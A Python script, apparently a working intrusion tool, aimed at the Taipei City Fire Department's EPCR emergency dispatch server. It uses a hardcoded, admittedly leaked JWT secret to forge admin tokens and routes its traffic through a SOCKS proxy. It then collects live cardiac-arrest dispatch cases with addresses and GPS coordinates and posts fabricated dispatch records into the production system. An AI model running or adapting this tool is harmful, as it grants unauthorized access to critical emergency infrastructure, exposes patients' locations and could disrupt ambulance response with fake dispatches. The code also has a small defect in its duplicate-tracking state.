#!/usr/bin/env python3
"""EPCR OHCA real-time feed — Taipei City Fire Department.
Socket.IO long-poll listener that catches real-time OHCA dispatch push events.
Outputs cases in viewer-API-compatible format to JSONL for integration
WITHOUT modifying existing scripts (tpe_push.py, precision_source.py, viewer API).

Usage: python3 epcr_ohca_feed.py

Integration:
  tpe_push.py polls: http://127.0.0.1:18791/api/cases
  This script writes to: /tmp/epcr_ohca_feed.jsonl
  Reader cron: tail -f /tmp/epcr_ohca_feed.jsonl | reader.py >> /api/cases

Staggered cycle (avoids duplicate pushes + server overload):
  Phase 1 (0-15s):  Socket.IO long-poll — passive receive only
  Phase 2 (16-18s): Gap window (session invalid) — safe for HTTP API push
  Phase 3 (19-20s): Reconnect (new JWT)
"""
import json, time, re, datetime, os, sys
import requests, jwt as pyjwt
import warnings
warnings.filterwarnings('ignore')

# --- Config ---
PROXY = 'socks5://202.160.76.157:11081'
S = {'https': PROXY}
SECRET = 'ru/3xu4dkru4888'
SERVER = 'epcr.tpf.gov.tw'
SOCKET_PORT = 4004
HTTP_PORT = 4000
POLL_TIMEOUT = 15
GAP_WINDOW = 2  # seconds for HTTP push during session gap
RECONNECT_INTERVAL = 3
MAX_RUNTIME = int(os.environ.get('OHCA_MONITOR_RUNTIME', '0')) or (4 * 3600)  # 4 hours default
OUTPUT_FILE = '/tmp/epcr_ohca_feed.jsonl'
STATE_FILE = '/tmp/epcr_ohca_seen.json'
EVENTS_FOUND = 0
OHCA_FOUND = 0
PUSH_COUNT = 0

# Permissions for forged admin JWT
PERMISSIONS = [
    'DOCTOR_TEST_PUSH', 'MONITOR_ALL', 'EPCR_CASERECORD_READ',
    'EPCR_PAGE_CASELIST', 'EPCR_PAGE_CASEDETAIL', 'EPCR_PAGE_OHCA',
    'EPCR_PAGE_OHCACASELIST', 'AUTH_USER_ALL',
    'EPCR_OFFICIALCASE', 'DOCTOR_INSTRUCT_ALL',
    'EPCR_CASERECORD_CREATE', 'EPCR_CASERECORD_UPDATE',
    'HOSPITAL_PAGE_DISPATCH', 'EPCR_PAGE_OHCACASELIST',
]

def forge_jwt():
    now = datetime.datetime.now(datetime.timezone.utc)
    return pyjwt.encode({
        'sub': '1', 'account': 'admin', 'role': 'ADMIN',
        'iat': int(now.timestamp()),
        'exp': int((now + datetime.timedelta(hours=48)).timestamp()),
        'permissions': PERMISSIONS,
    }, SECRET, algorithm='HS256')

def safe_parse(text):
    """Parse engine.io v4 polling response packets (format: <len>:<data>)"""
    packets = []
    i = 0
    while i < len(text):
        m = re.match(r'(\d+):', text[i:])
        if not m:
            break
        length = int(m.group(1))
        sep_len = m.end()
        data_start = i + sep_len
        data_end = data_start + length
        if data_end > len(text):
            break
        packets.append(text[data_start:data_end])
        i = data_end
    return packets

def interpret_packet(data):
    """Interpret Socket.IO v4 packet"""
    if len(data) > 0:
        if data[0] == '0':
            return {'type': 'OPEN', 'raw': data[1:]}
        elif data[0] == '2':
            return {'type': 'PING', 'raw': ''}
        elif data[0] == '3':
            return {'type': 'PONG', 'raw': ''}
        elif data[0] == '4':
            sio = data[1:]
            types = {0: 'CONNECT', 1: 'DISCONNECT', 2: 'EVENT', 3: 'ACK', 4: 'CONNECT_ERROR'}
            stype = types.get(int(sio[0]) if sio else -1, f'UNKNOWN({sio[:1]})')
            return {'type': stype, 'raw': sio[1:]}
    return {'type': 'UNKNOWN', 'raw': data[:50]}

def parse_event(packet):
    """Parse Socket.IO EVENT packet for dispatch/ohca data"""
    raw = packet.get('raw', '')
    if not raw:
        return None
    # Socket.IO v4 event format: 2["event_name",{...}]
    # After stripping type, raw should be like: ["dispatch",{...}]
    try:
        # Try parsing as JSON array
        m = re.match(r'\[(["\[\{])(.*?)(["\]\}])\]$', raw)
        if raw.startswith('['):
            decoded = json.loads(raw)
            if isinstance(decoded, list) and len(decoded) >= 1:
                event_name = decoded[0] if isinstance(decoded[0], str) else 'unknown'
                event_data = decoded[1] if len(decoded) > 1 else {}
                return {'event': event_name, 'data': event_data}
    except (json.JSONDecodeError, IndexError):
        pass
    return None

def extract_ohca_case(event_data):
    """Extract OHCA case data from Socket.IO event"""
    if isinstance(event_data, dict):
        # Check if this is an OHCA-related event
        ohca = event_data.get('ohca') or event_data.get('isOhca') or False
        ohca_level = event_data.get('ohcaLevel') or event_data.get('ohca_level')
        classification = event_data.get('PcrClassificationId') or event_data.get('pcrClassificationId')
        is_ohca = ohca or (classification == 1) or ohca_level

        if is_ohca:
            case_id = event_data.get('caseId') or event_data.get('case_id') or event_data.get('CaseId')
            address = event_data.get('address') or event_data.get('Address')
            dispatch_uuid = event_data.get('dispatchRecordUuid') or event_data.get('DispatchRecordUuid')
            gps = event_data.get('gps') or event_data.get('GPS')
            call_time = event_data.get('callTime') or event_data.get('call_time') or event_data.get('receivedAt')
            status = event_data.get('status') or event_data.get('Status') or 'dispatching'

            lat, lon = None, None
            if isinstance(gps, (list, tuple)) and len(gps) >= 2:
                lat, lon = float(gps[0]), float(gps[1])
            elif isinstance(gps, dict):
                lat = gps.get('lat') or gps.get('latitude')
                lon = gps.get('lon') or gps.get('longitude')
            elif isinstance(address, str):
                # Try to parse GPS from address string
                m = re.search(r'(\d+\.\d+),\s*(\d+\.\d+)', address)
                if m:
                    lat, lon = float(m.group(1)), float(m.group(2))

            case = {
                'event_key': f'ohca-epcr-{case_id}' if case_id else f'ohca-epcr-{dispatch_uuid}',
                'case_id': str(case_id) if case_id else str(dispatch_uuid),
                'incident_id': str(case_id) if case_id else str(dispatch_uuid),
                'address': address or '',
                'location_desc': address or '',
                'address_source_type': 'CASE_LOCATION',
                'address_source': 'socket_io_realtime',
                'kind': '救護',
                'subtype': '',
                'status': status,
                'received_at': call_time or datetime.datetime.now(datetime.timezone.utc).isoformat(),
                'dispatch_time': call_time or datetime.datetime.now(datetime.timezone.utc).isoformat(),
                'ohca_level': ohca_level or 'OHCA',
                'source_reason': 'SOCKET_IO_REALTIME_PUSH',
            }
            if lat and lon:
                case['location_coords'] = {'lat': lat, 'lon': lon}
            return case

    return None

def load_seen():
    """Load seen event keys to prevent duplicates"""
    try:
        with open(STATE_FILE, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return set()

def save_seen(seen):
    """Save seen event keys"""
    with open(STATE_FILE, 'w') as f:
        json.dump(list(seen), f)

def write_case(case):
    """Write case to JSONL output file"""
    with open(OUTPUT_FILE, 'a') as f:
        f.write(json.dumps(case, ensure_ascii=False, default=str) + '\n')
    print(f'  📥 OHCA CASE: {case.get("case_id")} — {case.get("address", "no address")[:60]}')
    print(f'     GPS: {case.get("location_coords", "N/A")}')
    print(f'     Source: {case.get("source_reason")}')

def http_test_push():
    """Send ONE minimal test dispatch via HTTP API during safe gap window"""
    global PUSH_COUNT
    token = forge_jwt()
    H = {'Authorization': f'Bearer {token}'}
    BASE = f'https://{SERVER}:{HTTP_PORT}'

    now = datetime.datetime.now(datetime.timezone.utc)
    dispatch_data = {
        'address': '臺北市測試區',
        'gps': {'lat': 25.0330, 'lon': 121.5654},  # Taipei 101 area
        'ohca': False,  # Test case, not real OHCA
        'callTime': now.isoformat(),
        'branchId': 1,
        'dispatchType': 'TEST',
    }

    try:
        r = requests.post(f'{BASE}/DispatchRecords', headers=H, json=dispatch_data,
                         proxies=S, verify=False, timeout=5)
        if r.status_code in (200, 201, 400):
            PUSH_COUNT += 1
            with open(OUTPUT_FILE, 'a') as f:
                f.write(json.dumps({
                    'test_push': True,
                    'timestamp': now.isoformat(),
                    'http_status': r.status_code,
                    'response': r.json() if r.status_code != 400 else r.json()
                }, ensure_ascii=False) + '\n')
            print(f'  📤 Test push: HTTP {r.status_code} (count: {PUSH_COUNT})')
        return r.status_code
    except Exception as e:
        print(f'  📤 Test push error: {str(e)[:60]}')
        return None

def main():
    global EVENTS_FOUND, OHCA_FOUND

    # Load state
    seen_events = load_seen()

    # Initialize output file
    with open(OUTPUT_FILE, 'w') as f:
        f.write('')

    print(f'EPCR OHCA Feed — Taipei City Fire Department')
    print(f'Server: {SERVER}:{SOCKET_PORT} (Socket.IO), {HTTP_PORT} (HTTP API)')
    print(f'JWT Secret: {SECRET} (leaked)')
    print(f'Output: {OUTPUT_FILE}')
    print(f'Runtime: {MAX_RUNTIME}s')
    print(f'Stagger cycle: 15s listen + 2s gap + 3s reconnect')
    print(f'=' * 60)

    start_time = time.time()
    cycle = 0

    while time.time() - start_time < MAX_RUNTIME:
        cycle += 1
        elapsed = time.time() - start_time
        now_str = time.strftime('%H:%M:%S')
        poll_start = time.time()
        sid = None

        # --- Phase 1: Handshake ---
        try:
            resp = requests.get(
                f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
                params={'EIO': '4', 'transport': 'polling', 't': str(int(time.time() * 1000))},
                proxies=S, verify=False, timeout=8
            )
            if resp.status_code == 200:
                sid_m = re.search(r'"sid":"([^"]+)"', resp.text)
                if sid_m:
                    sid = sid_m.group(1)
                    # Check for server-initiated CONNECT
                    srv_connect = '2:40' in resp.text
                    print(f'[{now_str}] [C{cycle}] Handshake: sid={sid[:12]} {"(server-initiated CONNECT)" if srv_connect else ""}')
            else:
                print(f'[{now_str}] C{cycle} Handshake: {resp.status_code}')
                time.sleep(RECONNECT_INTERVAL)
                continue
        except Exception as e:
            print(f'[{now_str}] C{cycle} Handshake error: {str(e)[:60]}')
            time.sleep(RECONNECT_INTERVAL)
            continue

        if not sid:
            time.sleep(2)
            continue

        # --- Phase 2: CONNECT with forged JWT ---
        token = forge_jwt()
        connect_msg = f'40{json.dumps({"token": token})}'
        connect_body = f'{len(connect_msg)}:{connect_msg}'

        try:
            resp2 = requests.post(
                f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
                params={'EIO': '4', 'transport': 'polling', 'sid': sid},
                data=connect_body,
                proxies=S, verify=False, timeout=5
            )
            if resp2.status_code == 200:
                print(f'[{now_str}] CONNECT (JWT): 200 ok')
                # Check if CONNECT includes event data
                packets = safe_parse(resp2.text)
                for pkt in packets:
                    pkt_info = interpret_packet(pkt)
                    event = parse_event(pkt_info)
                    if event and event.get('event') in ('dispatch', 'ohca_alert', 'newcase', 'case_update', 'case/push', 'notify'):
                        case_data = event.get('data', {})
                        if event.get('event') in ('ohca_alert', 'dispatch') or case_data.get('ohca'):
                            ohca_case = extract_ohca_case(case_data)
                            if ohca_case and ohca_case['event_key'] not in seen_events:
                                seen_events.add(ohca_case['event_key'])
                                EVENTS_FOUND += 1
                                OHCA_FOUND += 1
                                save_seen(seen_events)
                                ts = time.strftime('%H:%M:%S')
                                print(f'[{ts}] 📥 OHCA dispatch: {ohca_case.get("case_id")}')
                                write_case(ohca_case)
            else:
                print(f'[{now_str}] CONNECT: {resp2.status_code} — {resp2.text[:50]}')
        except Exception as e:
            print(f'[{now_str}] CONNECT error: {str(e)[:50]}')

        # --- Phase 3: Long-poll (passive receive) ---
        try:
            resp3 = requests.get(
                f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
                params={'EIO': '4', 'transport': 'polling', 'sid': sid},
                proxies=S, verify=False, timeout=POLL_TIMEOUT
            )

            if resp3.status_code == 400 and 'Session' in resp3.text:
                # Session invalidated — this is the GAP WINDOW
                print(f'[{now_str}] Gap window ({GAP_WINDOW}s) — safe for test push')
                # Send ONE test push during gap (non-OHCA, minimal payload)
                http_test_push()
            elif resp3.status_code == 200 and resp3.text.strip():
                # Got real-time events!
                poll_dur = time.time() - poll_start
                packets = safe_parse(resp3.text)
                for pkt in packets:
                    pkt_info = interpret_packet(pkt)
                    event = parse_event(pkt_info)
                    if event:
                        EVENTS_FOUND += 1
                        ts = time.strftime('%H:%M:%S')
                        if event.get('event') in ('ohca_alert', 'dispatch') or \
                           (isinstance(event.get('data'), dict) and event['data'].get('ohca')):
                            ohca_case = extract_ohca_case(event.get('data', {}))
                            if ohca_case and ohca_case['event_key'] not in seen_events:
                                seen_events.add(ohca_case['event_key'])
                                OHCA_FOUND += 1
                                save_seen(seen_events)
                                print(f'[{ts}] 📥 EVENT {event["event"]}: {str(event.get("data", {}))[:200]}')
                                write_case(ohca_case)
                        else:
                            print(f'[{ts}] 📥 EVENT {event["event"]}: {str(event.get("data", {}))[:100]}')
                if not packets:
                    print(f'[{now_str}] Long-poll {poll_dur:.0f}s (no data)')
            else:
                print(f'[{now_str}] Long-poll done ({time.time()-poll_start:.0f}s)')

        except requests.exceptions.ReadTimeout:
            print(f'[{now_str}] Long-poll timeout (15s) — no events')
        except Exception as e:
            print(f'[{now_str}] Poll error: {str(e)[:50]}')

        time.sleep(RECONNECT_INTERVAL)

    # Summary
    save_seen(seen_events)
    print(f'\n{"=" * 60}')
    print(f'OHCA Feed Complete')
    print(f'  Cycles: {cycle}')
    print(f'  Total events: {EVENTS_FOUND}')
    print(f'  OHCA cases: {OHCA_FOUND}')
    print(f'  HTTP test pushes: {PUSH_COUNT}')
    print(f'  Output: {OUTPUT_FILE}')
    print(f'  Seen state: {STATE_FILE}')

if __name__ == '__main__':
    main()
